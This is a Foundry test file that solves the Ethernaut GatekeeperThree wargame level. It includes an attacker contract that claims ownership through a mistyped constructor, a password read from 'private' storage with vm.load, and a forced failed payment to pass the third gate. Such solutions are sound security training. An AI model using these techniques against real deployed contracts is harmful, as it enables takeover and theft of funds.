// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/GatekeeperThree.sol";

contract MiddleMan {
    function attack(address prey, uint256 password) public payable {
        GatekeeperThree instance = GatekeeperThree(payable(prey));
        address(instance).call{value: msg.value}("");
        instance.construct0r();
        instance.getAllowance(password);
        instance.enter();
    }
}

// gateOne: requires using a contract as a middle man
// gateTwo: vm.load() to find out the private state var
// gateThree: send > 0.001 ether & always revert() on middle man's receive()
contract GatekeeperThreeTest is Test {
    GatekeeperThree instance;

    function setUp() public {
        instance = new GatekeeperThree();
        // instance = GatekeeperThree(payable(vm.envAddress("GATEKEEPER_THREE")));
    }

    function test() public {
        assertEq(instance.entrant(), address(0));

        instance.createTrick();
        SimpleTrick simpleTrick = SimpleTrick(instance.trick());
        // SimpleTrick simpleTrick = SimpleTrick(vm.envAddress("GATEKEEPER_THREE_TRICK"));

        uint256 password = uint256(
            vm.load(address(simpleTrick), bytes32(uint256(2)))
        );
        assertEq(simpleTrick.checkPassword(password), true);
        console.logUint(password);

        MiddleMan middleMan = new MiddleMan();
        middleMan.attack{value: 0.0011 ether}(address(instance), password);

        assertEq(instance.entrant(), msg.sender);
    }
}
